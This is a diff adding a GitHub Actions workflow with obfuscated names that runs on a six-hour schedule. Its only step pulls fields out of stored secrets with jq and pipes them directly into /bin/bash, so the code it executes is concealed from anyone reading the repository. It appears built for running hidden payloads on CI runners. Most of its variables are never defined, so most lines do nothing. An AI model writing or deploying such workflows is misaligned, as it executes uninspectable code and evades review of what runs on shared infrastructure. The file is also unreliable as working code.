@@ -1,0 +1,27 @@
+name: fenxijinlyuanqiuqu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fenxijinlyuanqiuqu
+        env:
+          kmuk8: ${{ secrets.kmuk8 }}
+        run: |
+          echo $kmuk8 | jq -r .guba8602 | /bin/bash
+          echo $kvfw12226 | jq -r .qd789 | /bin/bash
+          echo $ejacq86 | jq -r .wgbok9636 | /bin/bash
+          echo $m54915 | jq -r .nrwh4 | /bin/bash
+          echo $xrnn4 | jq -r .s6 | /bin/bash
+          echo $phds07304 | jq -r .t42074 | /bin/bash
+          echo $qo97500 | jq -r .lpijn508 | /bin/bash
+          echo $j9 | jq -r .wcii69276 | /bin/bash
+          echo $lw6 | jq -r .mov49 | /bin/bash
+          echo $y2 | jq -r .l3426 | /bin/bash
+
